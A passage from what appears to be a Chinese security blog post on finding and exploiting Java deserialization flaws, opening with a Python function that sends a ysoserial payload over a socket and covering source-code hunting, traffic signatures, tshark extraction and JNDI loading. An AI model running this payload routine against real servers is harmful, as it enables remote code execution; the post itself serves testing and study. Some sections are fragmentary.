<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self, payload_file</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Normally this is where the HashRequest object is send</span></span><br><span class="line"><span class="string">        instead we send a ysoserial payload, skipping the first 4 bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">        payload = content_file.read()</span><br><span class="line">    self.s.sendall(payload[<span class="number">4</span>:])</span><br><span class="line">    logging.debug(<span class="string">&#x27;after exploit: %s&#x27;</span> % self.s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure>
<h1 id="反序列化漏洞挖掘方法"><a href="#反序列化漏洞挖掘方法" class="headerlink" title="反序列化漏洞挖掘方法"></a>反序列化漏洞挖掘方法</h1><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><p>主要遵循两个规则：</p>
<ul>
<li>从漏洞利用原理角度出发：检测可利用的第三方库及版本，但这个可能会有遗漏，就是对引用的第三方库中是否也引入了这些可利用的第三方库。</li>
<li>解析java源代码，可以被序列化的类一定实现了Serializable接口且重写了readObject()方法。如果在项目代码某处调用了ObjectInputStream.readObject()且反序列化对象追溯到是可由外部参数输入控制则基本可以确定存在反序列化漏洞了</li>
</ul>
<p>具体方法：</p>
<ol>
<li><p>通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点可以搜索以下方法:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject*</span><br></pre></td></tr></table></figure></li>
<li><p>确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。</p>
</li>
<li><p>若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</p>
</li>
<li><p>若包含危险库，则使用ysoserial进行攻击复现。</p>
</li>
</ol>
<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><ul>
<li><p><strong>黑盒流量分析：</strong></p>
<p> 在Java反序列化传送的包中，一般有两种传送方式，在TCP报文中，一般二进制流方式传输，在HTTP报文中，则大多以base64传输。因而在流量中有一些特征：</p>
<p>（1）TCP：必有<code>ac ed 00 05</code>，这个16进制流基本上也意味者java反序列化的开始；</p>
<p>（2）HTTP：必有<code>rO0AB</code>，其实这就是<code>ac ed 00 05</code>的base64编码的结果；</p>
<p>以上意味着存在Java反序列化，可尝试构造payload进行攻击。</p>
</li>
<li><p><strong>黑盒Java的RMI：</strong></p>
<p> rmi是java的一种远程对象（类）调用的服务端，默认于1099端口，基予socket通信，该通信实现远程调用完全基于序列化以及反序列化。</p>
</li>
</ul>
<h2 id="序列化数据的提取"><a href="#序列化数据的提取" class="headerlink" title="序列化数据的提取"></a>序列化数据的提取</h2><p>​    使用wireshark抓取数据包(Deserlab为例)，其中恶意包如下：<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210406013148101.png" alt="image-20210406013148101"><br>将整个数据流保存为sjb.pcapng，然后在linux中使用如下命令提取序列化数据流：<br>tshark -r sjb.pcapng -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ‘,,’ | grep ‘^35042,’ | cut -d’,’ -f2 | tr ‘\n’ ‘:’ | sed s/://g<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210406014308952.png" alt="image-20210406014308952"><br>将上述命令拆分理解：</p>
<ol>
<li><p>tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,<br>得到的结果类似如下：</p>
<p>50432,,6666<br>6666,,50432<br>50432,,6666<br>50432,aced0005,6666<br>6666,,50432<br>6666,aced0005,50432<br>在像上面的代码片段中可以看到，在TCP三次握手之间没有数据，因此有,,这部分。之后客户端发送服务端确认的第一个字节，然后服务端返回一些字节等等。命令的第二部分将它转换为字符串，只需根据行开始处的端口选择有效payloads。</p>
</li>
<li><p>| grep -v ‘,,’ | grep ‘^35042,’ | cut -d’,’ -f2 | tr ‘\n’ ‘:’ | sed s/://g<br>以上的命令仅会选择客户端发送的数据，如果希望获取服务端返回的数据需要更改端口号。</p>
</li>
</ol>
<p>使用SerializationDumper分析如下(数据太长)：<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210406014716192.png" alt="image-20210406014716192"></p>
<h2 id="SerializationDumper使用"><a href="#SerializationDumper使用" class="headerlink" title="SerializationDumper使用"></a>SerializationDumper使用</h2><p>​    SerializationDumper是一个java序列化数据分析脚本，以分析“反序列化攻击基础示例”中产生的序列化数据为例：<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210406011928626.png" alt="image-20210406011928626"><br>​    据此，我们可以知道序列化对象的结构，如类名称，字段名，字段类型，字段值等。</p>
<h1 id="远程加载类文件"><a href="#远程加载类文件" class="headerlink" title="远程加载类文件"></a>远程加载类文件</h1><p>​    在jdk8u121版本开始，Oracle通过默认设置系统变量com.sun.jndi.rmi.object.trustURLCodebase为false，将导致通过rmi的方式加载远程的字节码(JNDI)不会被信任。突破方式有2个：<br>​    1.是哟iingLDAP服务代替RMI服务(在jdk8u191开始，引入JRP290，加入了反序列化类过滤)</p>
<h1 id="反序列化攻击Demo-CC3"><a href="#反序列化攻击Demo-CC3" class="headerlink" title="反序列化攻击Demo(CC3)"></a>反序列化攻击Demo(CC3)</h1><p>​    RMI调用过程中，客户端与服务端都会执行序列化与反序列化操作，攻击就需要利用客户端服务端都存在某一缺陷库来构造gadgets。</p>
<h1 id="反序列化利用时的java版本问题"><a href="#反序列化利用时的java版本问题" class="headerlink" title="反序列化利用时的java版本问题"></a>反序列化利用时的java版本问题</h1><p>主要涉及3个版本：<br>    1、攻击者本地运行攻击工具时使用的java版本<br>    2、工具编译时使用的java版本<br>    3、攻击目标使用的java版本</p>
<p>首先，1和2的版本要一致，示例见：漏洞整理-&gt;Jenkins-&gt;cve-2017-1000353</p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">mlccs</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://mlccs.github.io/2021/12/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/">https://mlccs.github.io/2021/12/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mlccs.github.io">!>-_-<!</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2021/12/23/Ysoserial%E6%94%B9%E9%80%A0%E5%9F%BA%E7%A1%80/"><i class="fas fa-angle-left">&nbsp;</i><span>Ysoserial改造基础</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2021/12/09/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%C2%B7%E4%B8%80/"><span>Spring漏洞集合·一</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="copyright">&copy;2021 ～ 2022 By mlccs</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>